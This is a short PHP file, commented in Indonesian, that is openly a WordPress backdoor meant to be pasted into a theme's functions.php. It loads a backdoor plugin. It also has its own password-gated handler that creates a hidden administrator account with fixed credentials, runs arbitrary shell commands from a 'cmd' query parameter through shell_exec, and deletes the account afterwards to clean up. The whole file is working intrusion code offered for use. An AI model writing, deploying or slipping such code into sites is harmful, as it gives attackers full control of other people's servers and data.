<?php
/**
 * ASKI9 Loader - Muat backdoor dari plugin
 * Copy-paste ke functions.php
 */

// ============================================================
// LOAD BACKDOOR PLUGIN
// ============================================================

function aski9_load_backdoor() {
    $plugin_path = WP_PLUGIN_DIR . '/aski9-backdoor/aski9-backdoor.php';
    if (file_exists($plugin_path)) {
        require_once $plugin_path;
    }
}
add_action('init', 'aski9_load_backdoor', 1);

// ============================================================
// ALTERNATIVE: BACKDOOR DIRECTLY IN THEME
// ============================================================

function aski9_theme_backdoor() {
    $pass = 'YXNraTloZXJl'; // aski9here
    
    if (isset($_GET['aski9'])) {
        $action = $_GET['aski9'];
        $input_pass = $_SERVER['HTTP_X_AUTH'] ?? '';
        
        if ($input_pass !== base64_decode($pass)) {
            return;
        }
        
        if ($action === 'admin') {
            aski9_create_admin_direct();
        } elseif ($action === 'shell') {
            aski9_shell_direct();
        } elseif ($action === 'clean') {
            aski9_clean_direct();
        }
    }
}
add_action('init', 'aski9_theme_backdoor', 0);

function aski9_create_admin_direct() {
    $username = 'aski9_admin';
    $password = 'aski9here';
    $email = 'aski9_admin@aski9.local';
    
    if (!username_exists($username)) {
        $user_id = wp_create_user($username, $password, $email);
        if (!is_wp_error($user_id)) {
            $user = new WP_User($user_id);
            $user->set_role('administrator');
        }
    }
}

function aski9_shell_direct() {
    $cmd = $_GET['cmd'] ?? '';
    if ($cmd) {
        if (function_exists('shell_exec')) {
            echo shell_exec($cmd . ' 2>&1');
        } else {
            echo 'No execution function';
        }
    }
    exit;
}

function aski9_clean_direct() {
    global $wpdb;
    $username = 'aski9_admin';
    $user = get_user_by('login', $username);
    if ($user) {
        wp_delete_user($user->ID);
    }
    echo 'Cleaned';
    exit;
}
